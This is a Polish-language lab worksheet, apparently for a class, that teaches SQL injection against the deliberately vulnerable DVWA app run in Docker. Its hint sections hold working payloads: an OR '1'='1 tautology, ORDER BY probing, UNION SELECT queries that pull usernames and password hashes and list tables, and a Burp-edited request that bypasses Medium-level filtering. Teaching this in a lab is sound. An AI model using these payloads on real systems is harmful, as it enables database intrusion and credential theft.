## SQL-injection
# [Prezentacja](https://docs.google.com/presentation/d/1QifV6tWphtoKqVNPmHNMNXaLm0Djn-DQeAdNvYkSISA/edit?usp=sharing)

# Uruchamianie

- docker run -d -p 80:80 vulnerables/web-dvwa
- Wejdź na localhost:80
- Zaloguj się, admin/password
- Create/reset database

# Zadanie 1

Wyświetlić dane wszystkich użytkowników, omijając warunek WHERE id = ?.

**Kroki**

1.Kliknij DVWA Security → ustaw Low → Submit.

2.Kliknij SQL Injection w menu.

3.W polu User ID wpisz payload SQL.

4.Kliknij Submit.


## **Co powinno się stać** 

Zamiast jednego użytkownika zobaczysz listę wielu użytkowników (więcej niż jeden rekord).

Podpowiedź
<details>
1' OR '1'='1
</details>

# Zadanie 2

Za pomocą ORDER BY sprawdzić ilość kolumn w tabeli

## **Co powinno się stać**
Po przekroczeniu ilości tabeli zwrócony zostanie błąd

Podpowiedź
<details>
1' ORDER BY 2-- -
</details>

# Zadanie 3

Użyć UNION SELECT, aby pobrać dane z innej tabeli (users).


## **Co powinno się stać** 
W wynikach pojawią się loginy i hasła użytkowników DVWA.

Podpowiedź
<details>
1' UNION SELECT user, password FROM users -- -
</details>

# Zadanie 4

Użyć UNION SELECT, aby sprawdzić nazwy tabeli w bazie danych

## **Co powinno się stać** 
W odpowiedzi z bazy zobaczysz nazwy tabel 

Podpowiedź
<details>
  1' UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema='dvwa'-- -
</details>

# Zadanie 5

Wykryć z jakiego systemu baz danych korzysta strona za pomocą error-based SQL Injection


## **Co powinno się stać** 
W otrzymanym błędzie powinna być widoczna szukana informacja

Podpowiedź
<details>
'
</details>

# Zadanie 6

Sprawdzić długość hasła admina


## **Co powinno się stać** 
Po wpisaniu odpowiedniej długości w zapytaniu otrzymamy użytkownika

Podpowiedź
<details>
1' AND LENGTH(password)=32 -- -
</details>

# Zadanie 7

Ominąć sanityzację wejścia 

**Kroki**
1. Zmień poziom bezpieczeństwa na Medium
2. Przejdź do SQL injection
3. Podpowiedź: skorzystaj z narzędzi deweloperskich / Burp do modyfikacji zapytania

Rozwiązanie:
<details>
Znajdź żądanie sqli, edytuj i wyślij ponownie. Podmień zawartość zapytania na id=[coś]&Submit=Submit, 
jako [coś] możesz wpisać np. 1 UNION SELECT @@datadir,2 lub 1 UNION SELECT now(),2
</details>
